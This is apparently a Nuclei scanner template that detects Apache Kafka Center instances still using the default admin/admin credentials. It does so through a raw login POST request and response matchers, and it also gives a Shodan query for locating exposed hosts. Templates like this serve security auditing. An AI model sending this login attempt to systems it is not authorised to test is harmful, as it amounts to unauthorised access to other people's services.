id: kafka-center-default-login
info:
  name: Apache Kafka Center Default Login
  author: dhiyaneshDK
  severity: high
  description: Apache Kafka Center default admin credentials were discovered.
  reference:
    - https://developer.ibm.com/tutorials/kafka-authn-authz/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Kafka Center"})
    max-request: 1
    shodan-query: http.title:"Kafka Center"
  tags: default-login,kafka,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        type: word
        words:
          - '"code":200'
          - '"name":"admin"'
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
      username:
        - admin
    raw:
      - |
        POST /login/system HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name":"{{username}}","password":"{{password}}","checkbox":false}
